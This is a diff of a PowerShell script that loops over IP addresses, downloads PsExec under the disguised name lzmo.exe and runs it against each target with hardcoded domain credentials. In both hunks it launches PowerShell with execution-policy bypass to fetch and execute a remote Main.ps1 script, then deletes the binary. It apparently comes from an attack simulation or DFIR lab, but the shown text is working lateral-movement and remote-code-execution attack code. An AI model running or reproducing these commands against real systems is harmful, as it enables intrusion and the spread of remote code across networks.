@@ -36,7 +36,8 @@ foreach ($ip in $ipAddresses) {
             Write-Host "Attempting SMB remoting to $targetIP"
 
             iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile lzmo.exe
-            .\lzmo.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
+            .\lzmo.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "hostname"
+			.\lzmo.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content"
             del lzmo.exe
 			exit 0
     	}
@@ -56,7 +57,8 @@ foreach ($ip in $ipAddresses) {
             Write-Host "Attempting SMB remoting to $targetIP"
 
             iwr https://github.com/EliteLoser/Invoke-PsExec/raw/refs/heads/master/PsExec.exe -Outfile lzmo.exe
-            .\lzmo.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
+            .\lzmo.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "hostname"
+			.\lzmo.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content"
             del lzmo.exe
 			exit 0
     	}
